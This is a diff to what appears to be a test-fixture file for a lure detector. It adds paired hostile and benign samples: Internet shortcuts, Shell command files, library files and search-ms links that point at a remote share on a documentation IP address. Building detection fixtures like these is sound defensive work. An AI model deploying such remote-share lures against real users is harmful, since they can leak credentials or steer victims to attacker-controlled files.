@@ -200,6 +200,26 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
         ),
         ("shortcut_powershell_encoded", powershell, powershell_miss),
         ("shortcut_mshta_remote", mshta, mshta_miss),
+        (
+            "win_internet_shortcut_launch",
+            b"[InternetShortcut]\r\nURL=file://192.0.2.10/share/report.pdf\r\n",
+            b"[InternetShortcut]\r\nURL=https://example.invalid/docs\r\n",
+        ),
+        (
+            "win_shortcut_remote_icon",
+            b"[Shell]\r\nCommand=2\r\nIconFile=\\\\192.0.2.10\\share\\i.ico\r\n",
+            b"[Shell]\r\nCommand=2\r\nIconFile=explorer.exe,3\r\n",
+        ),
+        (
+            "win_library_remote_location",
+            _library(b"\\\\192.0.2.10\\shared"),
+            _library(b"knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}"),
+        ),
+        (
+            "web_search_ms_remote",
+            b'<a href="search-ms:query=a&crumb=location:%5C%5C192.0.2.10%5Cs">x</a>\n',
+            b'<a href="search-ms:query=notes&crumb=location:C%3A%5CUsers">x</a>\n',
+        ),
         ("web_clickfix_lure", _clickfix(), b"Verify you are human. Complete the form.\n"),
         ("web_html_smuggling", _smuggle(), _smuggle().replace(b"example.zip", b"example.png")),
         ("container_disk_image", iso(), b"0123456789"),
@@ -282,6 +302,16 @@ def _clickfix() -> bytes:
     return (
         b"<p>Verify you are human. Press Win + R, then Ctrl + V.</p>"
         b'<script>navigator.clipboard.writeText("INERT");</script>'
+    )
+
+
+def _library(url: bytes) -> bytes:
+    return (
+        b'<?xml version="1.0" encoding="UTF-8"?>\r\n'
+        b'<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">'
+        b"<searchConnectorDescriptionList><searchConnectorDescription><simpleLocation>"
+        b"<url>" + url + b"</url></simpleLocation></searchConnectorDescription>"
+        b"</searchConnectorDescriptionList></libraryDescription>\r\n"
     )
 
 
